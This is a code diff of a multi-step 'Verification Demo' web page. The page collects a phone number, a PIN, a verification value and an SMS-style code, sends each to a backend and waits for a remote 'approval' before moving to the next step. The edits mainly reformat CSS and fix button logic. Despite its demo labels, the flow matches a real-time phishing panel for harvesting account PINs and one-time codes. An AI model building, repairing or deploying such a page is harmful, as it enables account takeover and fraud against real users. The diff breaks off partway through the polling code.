@@ -5,59 +5,203 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Verification Demo</title>
 <style>
-* { box-sizing: border-box; }
-:root {
-  --yellow: #ffcc00; --teal: #00566d; --white: #ffffff;
-  --text: #171717; --muted: #667085; --border: #d1d5db;
+* {
+  box-sizing: border-box;
 }
-body { margin: 0; background: #f1f3f5; font-family: Arial, sans-serif; color: var(--text); }
-.header { height: 135px; background: var(--yellow); border-top: 8px solid #111; display: flex; align-items: center; justify-content: center; }
-.logo { border: 5px solid #111; border-radius: 50%; padding: 15px 35px; font-size: 35px; font-weight: 900; }
-.card { width: calc(100% - 32px); max-width: 520px; margin: 25px auto; background: var(--white); border-radius: 30px; padding: 28px 22px; box-shadow: 0 10px 30px #00000010; }
-h1 { text-align: center; font-size: 28px; margin: 10px 0 20px; }
-p { text-align: center; line-height: 1.6; color: #414653; }
-.demo { text-align: center; font-size: 11px; color: var(--muted); margin-bottom: 20px; }
-label { display: block; font-weight: bold; margin: 22px 0 10px; }
-input[type="tel"], input[type="text"] { width: 100%; height: 60px; border: 2px solid var(--border); border-radius: 12px; padding: 0 14px; font-size: 20px; outline: none; }
-input:focus { border-color: #2878d0; }
-.boxes { display: flex; justify-content: center; gap: 9px; margin: 25px 0; }
-.boxes input { width: 58px; height: 66px; text-align: center; padding: 0; font-size: 25px; border: 2px solid var(--border); border-radius: 12px; outline: none; }
-.boxes input:focus { border-color: #2878d0; }
-button { width: 100%; height: 60px; margin-top: 20px; background: var(--yellow); border: none; border-radius: 12px; font-size: 20px; font-weight: bold; cursor: pointer; }
-button:disabled { opacity: 0.45; cursor: not-allowed; }
+
+:root {
+  --yellow: #ffcc00;
+  --teal: #00566d;
+  --white: #ffffff;
+  --text: #171717;
+  --muted: #667085;
+  --border: #d1d5db;
+}
+
+body {
+  margin: 0;
+  background: #f1f3f5;
+  font-family: Arial, sans-serif;
+  color: var(--text);
+}
+
+.header {
+  height: 135px;
+  background: var(--yellow);
+  border-top: 8px solid #111;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.logo {
+  border: 5px solid #111;
+  border-radius: 50%;
+  padding: 15px 35px;
+  font-size: 35px;
+  font-weight: 900;
+}
+
+.card {
+  width: calc(100% - 32px);
+  max-width: 520px;
+  margin: 25px auto;
+  background: var(--white);
+  border-radius: 30px;
+  padding: 28px 22px;
+  box-shadow: 0 10px 30px #00000010;
+}
+
+h1 {
+  text-align: center;
+  font-size: 28px;
+  margin: 10px 0 20px;
+}
+
+p {
+  text-align: center;
+  line-height: 1.6;
+  color: #414653;
+}
+
+.demo {
+  text-align: center;
+  font-size: 11px;
+  color: var(--muted);
+  margin-bottom: 20px;
+}
+
+label {
+  display: block;
+  font-weight: bold;
+  margin: 22px 0 10px;
+}
+
+input[type="tel"],
+input[type="text"] {
+  width: 100%;
+  height: 60px;
+  border: 2px solid var(--border);
+  border-radius: 12px;
+  padding: 0 14px;
+  font-size: 20px;
+  outline: none;
+}
+
+input:focus {
+  border-color: #2878d0;
+}
+
+.boxes {
+  display: flex;
+  justify-content: center;
+  gap: 9px;
+  margin: 25px 0;
+}
+
+.boxes input {
+  width: 58px;
+  height: 66px;
+  text-align: center;
+  padding: 0;
+  font-size: 25px;
+  border: 2px solid var(--border);
+  border-radius: 12px;
+  outline: none;
+}
+
+.boxes input:focus {
+  border-color: #2878d0;
+}
+
+button {
+  width: 100%;
+  height: 60px;
+  margin-top: 20px;
+  background: var(--yellow);
+  border: none;
+  border-radius: 12px;
+  font-size: 20px;
+  font-weight: bold;
+  cursor: pointer;
+  opacity: 1;
+  transition: opacity 0.2s ease;
+}
+
+button:disabled {
+  opacity: 0.45 !important;
+  cursor: not-allowed !important;
+  pointer-events: none;
+}
+
+/* Screenshot Accurate Progress Ring Component */
 .spinner {
   width: 54px;
   height: 54px;
   margin: 25px auto 15px;
-  /* Dark gray/translucent backdrop ring matching the image design */
   border: 5px solid #2d3748; 
-  /* Solid bright green foreground tracking indicator element */
   border-top-color: #38a169; 
   border-radius: 50%;
   animation: spin 1.2s cubic-bezier(0.4, 0, 0.2, 1) infinite;
 }
 
 @keyframes spin {
-  from {
-    transform: rotate(0deg);
-  }
-  to {
-    transform: rotate(360deg);
-  }
+  from { transform: rotate(0deg); }
+  to { transform: rotate(360deg); }
 }
 
-@keyframes spin { to { transform: rotate(360deg); } }
-.status { text-align: center; color: var(--teal); font-weight: bold; margin-top: 15px; }
-.error { color: #b42318; text-align: center; margin-top: 10px; font-weight: bold; }
-.notice { background: #fff4ce; padding: 15px; border-radius: 12px; line-height: 1.5; font-size: 14px; margin: 20px 0; }
-.hidden { display: none !important; }
-.success { text-align: center; font-size: 60px; color: #168348; }
-@media (max-width: 380px) { .card { padding: 22px 15px; } .boxes { gap: 6px; } .boxes input { width: 48px; height: 58px; } }
+.status {
+  text-align: center;
+  color: var(--teal);
+  font-weight: bold;
+  margin-top: 15px;
+}
+
+.error {
+  color: #b42318;
+  text-align: center;
+  margin-top: 10px;
+  font-weight: bold;
+}
+
+.notice {
+  background: #fff4ce;
+  padding: 15px;
+  border-radius: 12px;
+  line-height: 1.5;
+  font-size: 14px;
+  margin: 20px 0;
+}
+
+.hidden {
+  display: none !important;
+}
+
+.success {
+  text-align: center;
+  font-size: 60px;
+  color: #168348;
+}
+
+@media (max-width: 380px) {
+  .card {
+    padding: 22px 15px;
+  }
+  .boxes {
+    gap: 6px;
+  }
+  .boxes input {
+    width: 48px;
+    height: 58px;
+  }
+}
 </style>
 </head>
 <body>
 
-<header class="header"><div class="logo">DEMO</div></header>
+<header class="header">
+  <div class="logo">DEMO</div>
+</header>
 
 <main class="card">
   <div class="demo">DEMONSTRATION ONLY — NEVER ENTER REAL ACCOUNT CODES</div>
@@ -68,7 +212,7 @@ button:disabled { opacity: 0.45; cursor: not-allowed; }
     <p>Enter a nine-digit test number to begin the verification demonstration.</p>
     <label for="phone">Test phone number</label>
     <input id="phone" type="tel" inputmode="numeric" maxlength="9" placeholder="9 digits" autocomplete="off">
-    <button id="nextPhone" disabled>Next</button>
+    <button id="nextPhone" disabled="true">Next</button>
   </section>
 
   <!-- PAGE 2: DEMO PIN -->
@@ -90,7 +234,7 @@ button:disabled { opacity: 0.45; cursor: not-allowed; }
     <div class="notice">This is a simulated verification step. No SMS is sent.</div>
     <label for="code1">Test value</label>
     <input id="code1" type="text" autocomplete="off" placeholder="Enter a test value">
-    <button id="submitCode1" disabled>Continue</button>
+    <button id="submitCode1" disabled="true">Continue</button>
     <div id="code1Waiting" class="hidden">
       <div class="spinner"></div>
       <div class="status">Waiting for demo approval...</div>
@@ -134,7 +278,7 @@ window.addEventListener("DOMContentLoaded", async () => {
   }
 });
 
-// Helper: Setup inputs for individual box layouts (PIN and SMS code grids)
+// Setup dynamic item grid handling routines
 function setupBoxInputs(containerId, count, onComplete) {
   const container = document.getElementById(containerId);
   container.innerHTML = "";
@@ -167,15 +311,21 @@ function setupBoxInputs(containerId, count, onComplete) {
     container.appendChild(input);
     inputs.push(input);
   }
-  inputs[0].focus();
+  if(inputs[0]) inputs[0].focus();
 }
 
-// Track and validate Step 1 Phone Input
+// Fixed Step 1 Phone Input Dynamic Activation Routines
 const phoneInput = document.getElementById("phone");
 const nextPhoneBtn = document.getElementById("nextPhone");
+
 phoneInput.addEventListener("input", () => {
   phoneInput.value = phoneInput.value.replace(/\D/g, "");
-  nextPhoneBtn.disabled = phoneInput.value.length !== 9;
+  
+  if (phoneInput.value.length === 9) {
+    nextPhoneBtn.removeAttribute("disabled");
+  } else {
+    nextPhoneBtn.setAttribute("disabled", "true");
+  }
 });
 
 nextPhoneBtn.addEventListener("click", () => {
@@ -183,50 +333,59 @@ nextPhoneBtn.addEventListener("click", () => {
   document.getElementById("page1").classList.add("hidden");
   document.getElementById("page2").classList.remove("hidden");
   
-  // Render PIN Boxes dynamically now that we are on page 2
   setupBoxInputs("pinBoxes", 5, submitPinStage);
 });
 
-// Send phone + PIN data to backend
+// Post Phone & PIN bundle configurations
 async function submitPinStage(pinValue) {
   userData.pin = pinValue;
   document.getElementById("pinWaiting").classList.remove("hidden");
   
   const success = await sendStagePayload("pin", { phone: userData.phone, pin: userData.pin });
-  if (success) startPolling("pin", "page2", "page3", "pinWaiting", "pinMessage", () => {
-    // Fire up code2 input framework once page 3 finishes down the road
-    document.getElementById("code1").focus();
-  });
+  if (success) {
+    startPolling("pin", "page2", "page3", "pinWaiting", "pinMessage", () => {
+      setTimeout(() => document.getElementById("code1").focus(), 50);
+    });
+  }
 }
 
-// Track and validate Page 3 input element
+// Track and validate Page 3 input elements
 const code1Input = document.getElementById("code1");
 const submitCode1Btn = document.getElementById("submitCode1");
+
 code1Input.addEventListener("input", () => {
-  submitCode1Btn.disabled = code1Input.value.trim().length === 0;
+  if (code1Input.value.trim().length > 0) {
+    submitCode1Btn.removeAttribute("disabled");
+  } else {
+    submitCode1Btn.setAttribute("disabled", "true");
+  }
 });
 
 submitCode1Btn.addEventListener("click", async () => {
   userData.code1 = code1Input.value.trim();
-  submitCode1Btn.classList.add("hidden");
+  submitCode1Btn.setAttribute("disabled", "true");
   document.getElementById("code1Waiting").classList.remove("hidden");
 
   const success = await sendStagePayload("code1", { code1: userData.code1 });
-  if (success) startPolling("code1", "page3", "page4", "code1Waiting", "code1Message", () => {
-    setupBoxInputs("code2Boxes", 4, submitCode2Stage);
-  });
+  if (success) {
+    startPolling("code1", "page3", "page4", "code1Waiting", "code1Message", () => {
+      setupBoxInputs("code2Boxes", 4, submitCode2Stage);
+    });
+  }
 });
 
-// Send final SMS code input data block
+// Final step submission handler
 async function submitCode2Stage(code2Value) {
   userData.code2 = code2Value;
   document.getElementById("code2Waiting").classList.remove("hidden");
 
   const success = await sendStagePayload("code2", { code2: userData.code2 });
-  if (success) startPolling("code2", "page4", "page5", "code2Waiting", "code2Message");
+  if (success) {
+    startPolling("code2", "page4", "page5", "code2Waiting", "code2Message");
+  }
 }
 
-// Server Communication Pipeline
+// Pipeline transmission communications helper
 async function sendStagePayload(stage, payload) {
   try {
     const response = await fetch("/api/approval-request", {
@@ -240,27 +399,15 @@ async function sendStagePayload(stage, payload) {
   }
 }
 
-// Polling core module to wait for dynamic approval
+// Polling core infrastructure engine
 function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, successCallback) {
   const msgElement = document.getElementById(msgId);
   msgElement.className = "status";
   msgElement.innerText = "";
 
+  if(pollingInterval) clearInterval(pollingInterval);
+
   pollingInterval = setInterval(async () => {
     try {
       const res = await fetch(`/api/status?sessionId=${sessionId}&stage=${stage}`);
-      const data = await res.json();
-
-      if (data.status === "approved") {
-        clearInterval(pollingInterval);
-        document.getElementById(spinnerId).classList.add("hidden");
-        document.getElementById(currentPageId).classList.add("hidden");
-        document.getElementById(nextPageId).classList.remove("hidden");
-        if (successCallback) successCallback();
-      } else if (data.status === "declined") {
-        clearInterval(pollingInterval);
-        document.getElementById(spinnerId).classList.add("hidden");
-        msgElement.classList.add("error");
-        msgElement.innerText = "Submission declined. Please refresh and retry.";
-      }
 
